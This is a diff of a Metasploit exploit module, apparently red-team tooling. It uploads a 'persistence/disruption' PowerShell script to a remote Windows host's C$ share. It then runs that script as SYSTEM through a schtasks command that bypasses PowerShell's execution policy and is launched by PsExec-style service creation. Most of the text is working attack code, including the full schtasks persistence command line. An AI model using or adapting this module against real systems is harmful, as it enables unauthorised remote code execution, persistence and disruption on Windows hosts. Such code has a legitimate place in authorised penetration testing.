@@ -165,23 +165,20 @@ class MetasploitModule < Msf::Exploit::Remote
 
       print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\C$\\#{file_path}")
 
-      # Execute the script immediately via scheduled task
-      exec_cmd = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
-
       print_status("Executing persistence script via scheduled task...")
 
-      # Use Psexec mixin for reliable execution
-      self.simple = true
-      self.smb_share = 'C$'
-      self.service_name = 'RedTeamSvcTemp'
-      self.service_display_name = 'RedTeam Temporary Execution'
+      # Modern way – set options via datastore
+      datastore['SMB::Share']          = 'C$'
+      datastore['SERVICE_NAME']        = 'RedTeamSvcTemp'
+      datastore['SERVICE_DISPLAY_NAME'] = 'RedTeam Temporary Execution'
 
+      # Temporarily switch to windows/exec payload to run our schtasks command
       original_payload = payload
       cmd_payload = framework.payloads.create('windows/exec')
-      cmd_payload.datastore['CMD'] = exec_cmd
+      cmd_payload.datastore['CMD'] = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
       self.payload = cmd_payload
 
-      super  # Run the persistence command
+      super  # This runs the psexec service-creation logic
 
       self.payload = original_payload
 
